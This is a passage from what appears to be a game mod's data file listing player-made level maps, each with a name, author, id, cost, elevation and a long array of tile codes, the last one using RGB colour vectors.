,0,22,58,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,58,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,58,20,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,19,58,19,0,5,5,0,5,66,66,66,5,0,0,0,96,24,18,90,18,18,18,18,0,2,5,5,5,66,66,66,5,0,0,24,96,24,3,18,90,18,94,18,0,2,5,5,5,66,66,66,5,0,0,0,96,24,18,90,18,18,18,18,0,5,5,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Unbreakable",author="chinny",id="#1650814683",direction="left",cost=264,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,11,6,6,10,5,6,16,10,11,10,11,5,10,11,11,6,0,0,0,0,6,11,5,16,6,10,16,10,16,6,11,10,6,16,11,5,0,0,0,0,6,11,6,11,16,10,11,10,16,6,16,10,6,11,10,6,0,0,0,0,6,16,6,11,6,10,10,6,10,5,6,10,6,16,6,6,0,0,0,0,6,11,5,10,6,6,11,10,6,6,11,6,11,10,6,5,0,0,0,0,10,16,6,5,6,10,16,10,6,10,16,6,10,5,10,16,0,0,0,0,16,11,6,10,6,10,16,10,10,6,16,10,6,10,6,16,0,0,0,0,11,16,6,16,10,6,11,6,10,10,6,11,6,6,6,11,0,0,0,0,10,6,16,10,6,6,10,6,11,6,5,16,11,6,10,6,0,0,0,0,16,16,6,10,6,5,11,5,16,11,6,16,16,6,11,10,0,0,0,0,10,16,10,6,11,10,16,6,16,10,16,10,6,5,16,11,0,0,0,0,6,11,10,6,16,10,16,6,11,6,16,11,6,6,16,5,0,0,0,0,6,5,10,6,16,6,11,10,16,6,16,11,6,10,10,6,0,0,2,10,10,6,16,6,11,6,16,6,16,6,11,16,6,11,6,6,0,0,2,10,6,10,10,6,11,5,6,11,16,16,6,16,6,16,6,10,0,0,0,0,10,6,11,10,6,6,5,10,16,11,6,5,10,16,10,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="menage a trois",author="iProbie",id="#1650816258",direction="forward",cost=158,elevation=0,map=[0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,7,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,9,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,11,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,13,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,15,0,0,0,0,0,5,0,0,0,0,0,5,0,92,0,5,0,0,1,17,1,0,0,0,1,4,1,0,0,0,1,1,1,0,0,5,0,0,1,17,1,0,0,0,1,8,1,0,0,0,1,1,1,0,0,5,0,0,1,97,1,0,0,0,1,97,1,0,0,0,97,5,5,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,17,1,0,0,0,1,8,1,0,0,0,5,5,5,0,0,5,0,0,1,17,1,0,0,0,1,8,1,0,0,0,1,1,1,0,0,5,0,0,1,17,1,0,0,0,1,65,1,0,0,0,1,1,1,0,0,5,0,0,0,15,0,0,0,0,0,5,0,0,0,0,0,5,0,92,0,5,0,0,0,13,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,11,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,9,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,7,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,96,96,96,96,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,96,2,2,96,5,0,0,0,0,0,0,0]});
maps.push({name="Bladder Ladder",author="Midran Kidran",id="#1650820291",direction="forward",cost=440,elevation=19,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,7,7,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,7,7,9,9,1,5,5,3,5,5,3,5,5,3,5,5,3,5,5,1,9,9,11,11,1,11,11,11,11,11,11,11,11,11,11,11,11,11,11,1,11,11,13,13,1,11,11,11,11,11,11,11,11,11,11,11,11,11,11,1,13,13,15,15,1,11,11,3,11,11,3,11,11,3,11,11,3,11,11,1,15,15,17,17,1,18,18,18,18,18,18,18,18,18,18,18,18,18,18,1,17,17,19,19,1,18,18,18,18,18,18,18,18,18,18,18,18,18,18,1,19,19,21,21,1,18,18,3,18,18,3,18,18,3,18,18,3,18,18,1,21,21,23,23,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,23,23,24,24,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,24,24,97,24,24,24,1,24,24,24,24,24,24,24,24,24,24,1,24,24,24,97,91,91,1,1,1,91,1,1,1,96,96,1,1,1,91,1,1,1,91,91,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,1,1,1,1,1,1,98,98,1,1,1,1,1,1,1,1,24,24,91,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,91,24,24,1,24,24,24,24,24,24,24,95,95,24,24,24,24,24,24,24,1,24,99,1,24,24,24,24,24,24,95,2,2,95,24,24,24,24,24,24,1,99]});
maps.push({name="Water Temple v3",author="Squidward",id="#1650820845",direction="forward",cost=436,elevation=-4,map=[1,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,0,0,2,2,1,24,13,66,69,69,66,13,90,19,19,19,13,19,19,24,1,0,24,24,1,24,13,24,24,24,90,13,13,67,92,67,13,19,100,24,1,0,24,24,1,24,91,24,1,24,90,13,13,13,13,90,13,19,19,24,1,0,23,23,1,13,13,24,1,24,65,13,65,65,13,13,13,65,24,1,0,0,22,23,1,99,13,24,1,24,13,13,90,13,90,13,13,24,24,1,0,22,22,22,1,24,24,24,24,24,13,13,65,13,13,13,90,24,1,1,0,22,22,0,1,24,20,90,20,13,98,65,65,13,24,14,24,24,1,0,0,22,22,0,1,24,65,20,20,3,13,98,13,24,12,13,24,1,1,0,0,0,0,0,1,24,90,20,20,13,3,13,24,10,11,24,24,1,0,0,0,0,0,0,1,24,20,20,90,20,20,13,24,9,24,24,1,1,0,7,7,7,7,0,1,24,65,65,20,90,20,24,8,8,24,1,1,0,0,7,65,65,7,7,1,24,65,65,20,20,20,24,96,96,24,1,0,0,7,90,65,65,65,7,1,24,20,90,90,20,90,24,7,7,24,1,1,24,7,65,65,65,7,0,1,24,20,20,20,20,20,24,7,7,24,24,1,24,7,65,65,65,7,0,1,24,20,90,20,24,24,6,7,7,7,24,24,24,7,66,66,65,7,0,1,24,65,65,20,24,6,97,7,66,68,69,69,69,68,68,66,90,7,0,1,24,20,20,100,24,24,6,7,7,7,24,24,24,7,7,7,5,0,0,1,24,20,20,24,1,24,24,24,24,24,24,1,24,0,0,0,0,0,0,1,24,2,2,24,1,1,1,1,1,1,1,1,24,0,0,0,0,0,0]});
maps.push({name="watchurstep",author="chong",id="#1650821620",direction="forward",cost=490,elevation=4,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,9,9,9,76,9,9,9,9,9,76,9,9,9,9,9,9,76,9,9,9,76,10,10,10,10,76,10,10,10,10,10,76,10,76,10,10,10,10,10,10,12,12,76,12,12,12,12,76,12,76,12,12,12,12,12,76,12,12,76,12,14,14,14,76,14,14,14,14,14,14,14,76,76,14,14,14,76,14,14,14,15,15,76,15,15,15,76,15,15,76,15,15,15,76,15,15,15,15,15,15,17,17,17,17,76,17,17,17,17,17,17,17,17,17,76,17,17,17,76,17,19,19,76,19,19,19,76,19,76,19,19,76,19,19,19,19,76,19,19,19,20,20,20,20,76,20,20,20,20,20,20,20,20,76,20,20,20,76,20,20,76,22,22,22,22,22,22,76,22,22,76,22,22,22,22,22,22,22,22,76,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,27,27,27,27,27,27,25,25,25,25,25,25,25,25,25,25,25,25,25,25,27,29,29,29,29,27,25,25,25,25,25,25,25,25,25,25,25,25,25,25,27,29,2,2,29,27,25,25,25,25,25,25,25]});
maps.push({name="gosword",author="FLaN KS",id="#1650823664",direction="forward",cost=177,elevation=1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,66,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,52,66,12,12,0,0,0,0,0,0,0,0,0,0,12,0,0,0,12,52,66,52,12,0,0,0,0,0,0,0,0,0,0,0,12,12,0,12,52,66,52,12,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,52,66,52,12,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,12,12,52,12,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,12,12,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,13,0,12,12,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,13,13,74,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,74,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,76,73,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="down to up",author="Bucket Head",id="#1650824669",direction="forward",cost=423,elevation=10,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,15,15,15,15,15,15,15,15,1,12,12,12,12,12,1,1,5,5,1,1,15,15,15,15,15,15,15,15,1,12,12,12,12,12,1,1,5,5,1,1,15,15,1,1,1,15,15,15,1,12,12,1,12,12,1,1,5,5,1,1,15,15,1,1,1,0,0,0,1,12,12,1,12,12,1,1,5,5,1,1,15,15,1,1,1,0,0,0,1,12,12,1,12,12,1,1,5,5,1,1,15,15,1,1,1,0,0,0,1,12,12,1,12,12,1,1,3,3,1,1,91,91,1,1,1,92,0,92,1,13,13,1,12,12,1,1,8,8,1,1,91,91,1,1,1,15,15,15,1,13,13,1,12,12,1,1,8,8,1,1,91,91,1,1,1,15,15,15,1,14,14,1,4,4,1,1,8,8,1,1,91,91,1,1,1,0,0,0,1,14,14,1,8,8,1,1,8,8,1,1,1,15,1,1,1,0,0,0,1,15,15,1,98,98,1,1,8,8,1,1,1,15,1,1,1,0,0,0,1,15,15,1,8,8,1,1,97,8,1,1,1,91,1,1,1,92,0,92,1,15,15,1,99,8,1,1,8,8,1,1,1,91,1,1,1,15,15,15,1,15,15,1,8,8,1,1,96,96,1,1,15,15,1,1,1,15,15,15,1,15,15,1,8,8,1,1,8,8,1,1,91,1,1,1,1,15,15,15,1,15,15,1,8,8,1,1,8,8,1,1,91,1,1,1,1,15,15,15,101,15,15,1,8,8,8,8,8,8,1,1,15,15,1,1,1,15,15,15,101,102,15,1,8,8,8,8,8,8,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Just run and hold",author="WrexGigarton",id="#1650834110",direction="right",cost=274,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,58,58,58,57,56,55,14,14,14,13,12,11,10,9,8,7,6,5,5,1,58,58,58,57,56,55,14,14,14,13,12,11,10,9,8,7,6,5,5,1,58,58,58,57,56,55,14,14,14,13,12,11,10,9,8,7,6,5,5,1,58,58,58,1,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,1,58,58,58,1,0,0,0,0,24,24,89,24,0,0,0,0,0,5,5,1,58,58,58,1,0,0,0,0,89,93,93,89,0,0,0,0,0,5,5,1,58,58,58,1,0,0,0,0,24,89,24,89,0,0,0,0,0,5,5,1,58,58,58,1,0,0,0,0,24,24,89,24,0,0,0,0,5,5,5,1,58,58,58,1,0,0,0,0,24,24,24,24,0,0,0,0,5,94,5,1,58,58,58,1,0,0,0,0,91,91,91,91,0,0,0,0,5,5,5,1,58,58,58,24,24,24,85,85,24,24,24,24,24,24,24,24,0,0,0,1,58,58,58,24,24,24,85,85,24,24,24,24,24,24,24,24,0,0,0,1,58,58,58,24,24,24,85,85,24,24,24,24,24,24,24,24,0,0,0,1,58,58,58,18,18,0,0,0,0,0,0,0,0,24,24,24,0,0,0,1,58,58,58,18,18,0,0,0,0,0,0,0,0,24,24,24,0,0,0,1,24,24,24,18,18,0,0,0,0,0,0,0,0,95,95,95,0,0,0,1,18,3,18,18,18,0,40,0,42,0,44,0,42,24,24,24,95,24,2,1,18,18,18,18,18,0,40,0,42,0,44,0,42,24,24,24,95,24,2]});
maps.push({name="Super Star",author="Big Smoke",id="#1650838643",direction="forward",cost=169,elevation=-2,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,41,41,1,0,0,0,0,0,0,0,0,1,40,1,0,0,0,0,0,1,1,40,1,0,0,0,0,0,0,0,0,1,40,40,1,0,0,1,1,40,40,40,1,0,0,0,0,0,0,0,0,1,40,40,40,1,1,40,40,40,40,1,0,0,0,0,0,0,0,0,0,1,40,40,40,40,40,40,40,40,40,1,0,0,0,0,0,0,0,0,1,1,40,40,40,40,40,40,40,40,1,0,0,0,0,0,0,0,1,1,40,40,40,1,1,1,40,40,40,40,1,0,0,0,0,0,0,1,40,40,40,40,40,40,40,40,40,40,40,1,0,0,0,0,0,0,0,1,40,40,40,40,40,40,40,40,40,40,40,1,0,0,0,0,0,0,0,0,1,1,40,40,40,1,1,1,40,40,40,40,1,0,0,0,0,0,0,0,0,0,1,1,40,40,40,40,40,40,40,40,1,0,0,0,0,0,0,0,0,0,0,1,40,40,40,40,40,40,40,40,40,1,0,0,0,0,0,0,0,0,0,1,40,40,40,1,1,40,40,40,40,1,0,0,0,0,0,0,0,0,0,1,40,40,1,0,0,1,1,40,40,40,1,0,0,0,0,0,0,0,0,1,40,1,0,0,0,0,0,1,1,40,1,0,0,0,0,0,0,0,0,1,39,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Broken Fountain",author="Jando",id="#1650844136",direction="forward",cost=149,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,20,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,20,20,20,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,20,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,17,17,20,0,0,0,0,17,17,0,0,0,0,17,17,0,0,0,0,0,17,20,0,0,0,0,0,17,17,0,0,0,0,0,17,17,0,0,0,0,17,20,0,0,0,0,17,17,17,17,0,0,0,0,17,17,17,0,0,0,17,20,0,0,0,17,17,65,65,17,17,0,0,0,98,97,98,0,0,0,17,20,0,0,0,17,17,65,65,17,17,0,0,0,98,98,98,0,0,0,17,20,0,0,0,0,17,17,17,17,0,0,0,0,0,17,0,0,0,0,17,20,0,0,0,0,0,17,99,0,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,20,17,0,17,0,0,0,0,0,20,17,20,0,0,0,0,0,0,0,0,0,0,17,0,0,0,0,0,0,0,17,17,17,0,0,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,20,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,2,2,96,0,0,0,0,0,0,0,0,0]});
maps.push({name="pusheen w donut",author="NekoAndRew",id="#1650850250",direction="forward",cost=292,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,11,11,19,19,19,11,1,0,0,0,0,0,0,1,1,1,11,11,19,19,11,19,19,19,19,19,11,1,0,0,0,1,1,11,19,19,19,19,19,19,19,19,19,19,19,19,19,1,0,1,1,11,19,19,19,19,19,19,19,1,19,1,19,21,21,19,19,1,1,94,19,19,19,19,1,19,19,19,19,1,19,1,19,19,19,19,1,1,0,1,11,19,19,21,19,19,19,19,19,60,1,60,19,19,19,19,1,1,0,0,1,11,19,21,19,19,1,19,60,86,86,86,60,19,19,19,11,1,0,0,1,11,19,19,19,1,19,19,60,86,93,86,60,19,19,19,11,1,0,0,1,11,19,19,19,19,1,19,60,86,86,86,60,19,19,19,11,1,0,1,11,19,19,19,19,19,19,19,19,60,1,60,19,19,19,19,11,1,1,94,19,19,19,19,1,19,19,19,19,1,19,1,19,19,19,21,1,1,0,1,1,11,19,19,19,19,19,19,19,1,19,1,19,19,19,21,1,1,0,0,0,1,1,11,19,21,21,21,19,19,19,19,19,19,19,19,19,1,0,0,0,0,0,1,1,1,11,11,19,11,19,19,19,11,11,19,19,1,0,0,0,0,0,0,0,0,1,1,1,11,11,19,1,1,1,19,19,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,19,100,1,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,1,1,95,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,1,1,0,0]});
maps.push({name="water park",author="fantasy",id="#1650851475",direction="right",cost=433,elevation=1,map=[65,2,2,65,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,65,0,0,1,14,14,14,14,24,24,24,64,64,24,24,1,5,5,5,5,65,0,0,1,14,14,14,14,24,93,24,1,1,24,24,1,5,87,87,5,65,0,14,96,14,87,14,14,24,24,24,64,64,24,24,1,5,5,5,5,65,0,85,1,14,14,14,14,24,24,24,64,64,24,24,1,5,5,5,5,65,0,13,1,14,14,14,14,24,94,24,1,1,24,24,1,5,5,5,5,65,0,85,1,14,14,14,14,24,24,24,64,64,24,24,1,65,45,45,65,0,0,12,1,1,92,92,0,1,66,1,1,1,24,24,1,65,45,45,65,11,11,11,1,1,0,0,0,1,66,1,0,67,24,24,67,65,45,45,65,0,0,14,14,1,0,0,0,1,66,1,0,67,22,22,67,5,5,5,5,65,0,0,14,1,0,0,0,1,66,1,0,67,20,20,67,5,11,11,5,65,0,0,14,1,0,0,0,1,66,1,0,67,18,18,67,5,5,5,5,65,0,0,14,1,0,0,0,1,24,1,0,67,16,16,67,65,45,45,65,65,0,0,14,1,0,0,0,1,66,1,0,67,14,14,67,65,45,45,65,65,0,14,14,1,0,0,0,1,66,1,0,67,12,12,67,65,46,46,65,65,0,14,24,1,0,0,0,1,66,1,0,67,10,10,67,65,8,8,65,11,0,14,24,1,14,14,1,1,66,1,0,67,8,8,67,65,8,8,65,10,0,14,24,1,3,3,1,1,66,1,1,67,6,6,2,65,8,8,65,9,0,97,24,1,24,24,24,24,24,24,1,67,6,6,2,65,65,65,65,0,0,14,24,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="easy split",author="fantasy",id="#1650852119",direction="forward",cost=233,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,1,1,1,1,0,0,0,0,0,20,20,20,0,0,24,24,19,19,5,5,19,89,19,24,24,0,0,0,24,20,20,0,0,0,24,24,3,19,3,5,19,19,4,24,24,92,0,0,24,20,20,0,0,0,24,24,3,19,5,3,19,89,19,24,24,0,0,0,24,20,20,20,0,0,24,24,19,19,5,5,19,19,4,24,24,92,0,0,24,20,20,0,0,0,24,24,24,24,24,24,24,24,24,24,24,0,0,0,24,19,19,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,44,44,44,17,17,0,0,0,0,0,0,44,44,0,62,62,62,62,0,1,44,87,44,16,16,0,0,0,0,0,0,0,0,0,0,0,62,62,0,1,44,94,44,95,1,0,0,0,0,0,0,44,44,0,0,0,62,62,0,1,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,62,62,0,1,0,0,0,15,15,0,0,0,0,0,0,44,44,0,0,0,62,62,0,1,44,44,44,3,3,0,0,0,0,0,0,0,0,0,0,0,62,62,0,1,44,87,44,24,24,0,0,0,0,0,0,85,24,0,0,0,62,62,0,1,44,93,44,64,64,0,0,0,0,0,0,24,85,0,0,0,63,63,0,1,0,0,0,64,64,0,0,0,0,0,0,85,24,0,0,0,64,64,0,1,0,0,0,64,64,64,64,64,85,24,85,24,85,0,0,0,64,64,0,1,44,44,44,64,100,64,64,64,24,85,24,85,24,0,0,0,24,24,0,0,44,87,44,1,1,1,1,1,0,0,0,0,0,0,0,0,2,2,0,1,44,93,44]});
maps.push({name="twin towers",author="iProbie",id="#1650864465",direction="forward",cost=128,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,96,24,24,24,24,24,92,5,0,0,0,0,0,0,0,0,0,0,0,0,96,24,24,24,24,24,5,5,0,0,0,0,0,0,0,0,5,5,65,65,96,24,24,97,24,24,3,5,0,0,0,0,0,0,0,0,5,0,0,0,96,24,24,24,24,24,5,5,0,0,0,0,0,0,0,0,5,0,0,0,96,24,24,24,24,24,92,5,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,5,3,5,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bucket Head",author="Bucket Head",id="#1650868651",direction="forward",cost=302,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,5,5,1,0,0,0,0,0,0,0,0,0,1,1,7,6,6,6,5,5,5,5,59,1,0,0,0,0,0,0,0,1,7,7,7,6,12,12,12,12,12,12,59,59,1,1,0,0,0,0,1,7,7,12,12,12,12,12,12,15,15,15,59,59,59,59,1,0,1,1,8,8,12,12,12,12,12,15,15,15,15,15,59,59,59,59,1,0,1,10,9,12,12,12,15,15,15,15,15,15,15,15,1,59,59,59,1,0,1,10,10,12,12,15,15,15,15,15,15,15,15,15,59,59,59,59,1,0,1,10,10,12,15,15,15,15,15,15,15,15,15,15,59,59,1,59,1,0,1,10,10,12,15,15,15,15,15,15,15,15,15,15,59,59,59,1,1,0,1,10,10,12,15,15,15,15,15,15,15,15,15,15,59,59,59,1,1,0,1,10,10,12,15,15,15,15,15,15,15,15,15,15,59,59,1,59,1,0,1,10,10,12,15,15,15,15,15,15,15,15,15,15,59,59,59,59,1,0,1,9,9,12,12,12,12,15,15,15,15,15,15,15,1,59,59,59,1,0,1,1,8,8,7,12,12,12,12,15,15,15,15,15,59,59,76,59,1,0,0,1,1,1,7,7,7,6,12,12,12,12,12,15,59,59,59,59,1,0,0,0,0,1,1,1,1,6,6,6,5,5,12,12,59,59,59,1,1,0,0,0,0,0,0,0,1,1,1,1,5,5,5,5,59,59,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0]});
maps.push({name="FYS",author="FYS",id="#1650870558",direction="forward",cost=165,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,Vector(188,32,80),Vector(189,32,81),Vector(190,34,81),0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(186,32,81),Vector(189,34,81),Vector(188,29,78),Vector(214,115,147),0,Vector(189,33,81),Vector(189,33,81),Vector(188,32,80),Vector(178,8,62),0,0,0,0,0,0,0,0,0,0,Vector(188,37,82),Vector(188,32,81),Vector(189,32,80),Vector(188,31,80),Vector(198,60,103),Vector(209,100,131),0,Vector(187,27,77),Vector(195,54,97),Vector(212,108,139),Vector(216,128,157),0,0,0,0,0,0,0,0,Vector(190,34,82),Vector(188,33,81),Vector(189,33,81),Vector(188,33,80),0,Vector(197,61,103),Vector(197,59,101),Vector(182,27,73),0,Vector(189,33,81),Vector(194,50,95),Vector(187,33,81),0,0,0,0,0,0,0,Vector(204,51,102),Vector(188,30,77),Vector(189,33,81),Vector(189,33,79),0,0,0,0,Vector(209,97,131),0,0,Vector(189,33,81),Vector(189,33,81),Vector(186,35,82),0,0,0,0,0,0,Vector(216,114,147),Vector(198,63,105),Vector(186,24,74),Vector(188,27,74),Vector(186,22,73),0,Vector(193,50,93),0,Vector(212,109,141),Vector(183,17,72),0,Vector(189,33,81),Vector(189,33,81),Vector(189,34,81),0,0,0,0,0,0,Vector(186,24,74),Vector(202,77,115),Vector(210,105,137),Vector(206,91,126),Vector(210,105,139),Vector(205,93,128),0,Vector(211,107,139),Vector(194,48,93),Vector(188,35,81),0,Vector(189,33,81),Vector(189,33,81),Vector(188,33,80),0,0,0,0,0,0,Vector(189,34,70),Vector(188,30,81),Vector(187,27,77),Vector(189,33,81),Vector(186,26,75),Vector(186,21,76),0,Vector(213,113,144),Vector(190,34,82),Vector(189,35,81),0,Vector(189,33,81),Vector(189,33,81),Vector(188,33,80),0,0,0,0,0,0,Vector(190,33,42),Vector(189,33,81),Vector(189,33,81),Vector(188,32,81),Vector(191,35,81),0,Vector(186,22,71),Vector(213,113,143),Vector(191,38,85),Vector(184,35,78),0,Vector(189,33,81),Vector(189,33,81),Vector(187,33,82),0,0,0,0,0,0,Vector(185,35,35),Vector(189,33,64),Vector(187,33,83),0,0,Vector(189,33,81),Vector(188,30,78),Vector(205,84,121),Vector(204,83,121),0,Vector(189,34,80),Vector(189,33,81),Vector(189,33,81),Vector(187,33,81),0,0,0,0,0,0,0,Vector(189,32,42),0,Vector(184,28,85),Vector(189,32,81),Vector(189,33,81),Vector(189,33,81),Vector(188,34,81),Vector(221,144,168),0,Vector(188,32,80),Vector(189,33,81),Vector(189,33,81),0,0,0,0,0,0,0,0,0,0,Vector(187,32,80),Vector(189,33,81),Vector(189,33,81),Vector(189,33,81),Vector(188,27,76),0,Vector(217,128,157),Vector(194,47,92),Vector(187,25,75),Vector(186,28,76),0,0,0,0,0,0,0,0,0,Vector(185,31,85),Vector(189,33,81),Vector(189,33,81),Vector(188,33,81),Vector(188,37,82),0,Vector(186,31,79),Vector(192,43,89),Vector(214,117,147),Vector(214,118,147),0,0,0,0,0,0,0,0,0,0,Vector(190,32,60),Vector(189,33,83),Vector(188,33,81),Vector(191,32,80),0,Vector(189,34,80),Vector(189,33,81),Vector(189,33,81),Vector(187,26,75),Vector(191,37,85),0,0,0,0,0,0,0,0,0,0,0,Vector(189,32,66),Vector(189,32,83),0,Vector(191,35,81),Vector(188,33,81),Vector(189,33,81),Vector(189,33,81),Vector(189,32,80),0,0,0,0,0,0,0,0,0,0,0,0,Vector(190,33,40),0,Vector(182,36,73),Vector(188,33,80),Vector(189,33,81),Vector(189,33,81),Vector(188,33,81),Vector(170,42,85),0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(191,32,32),Vector(190,34,81)